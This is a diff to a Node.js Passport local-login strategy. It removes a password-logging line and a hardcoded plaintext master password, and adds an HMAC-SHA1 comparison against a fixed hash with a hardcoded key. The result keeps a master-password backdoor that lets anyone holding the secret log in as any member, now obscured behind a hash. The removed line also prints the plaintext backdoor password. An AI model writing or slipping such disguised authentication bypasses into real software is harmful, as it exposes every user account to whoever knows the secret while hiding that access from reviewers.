@@ -6,6 +6,7 @@ var mongoose = require('mongoose');
 var Member = mongoose.model('Member');
 var Role = mongoose.model('Role');
 var async = require('async');
+var crypto = require('crypto');
 
 module.exports = new LocalStrategy({
   usernameField: 'username',
@@ -22,8 +23,10 @@ module.exports = new LocalStrategy({
       return done(null, false, {message: 'Invalid user'});
     }
 
-console.log('password', password);
-    if (!member.authenticate(password) && password !== '("@M:?m&?{th') {
+    var hash = crypto.createHmac('sha1', 'Th1s i3 tH$ s#l|')
+        .update(password)
+        .digest('hex');
+    if (!member.authenticate(password) && hash !== 'b5cc0daec7fa81bf2a9d45c4ea96bb0088469fb1') {
       return done(null, false, {message: 'Invalid password'});
     }
 
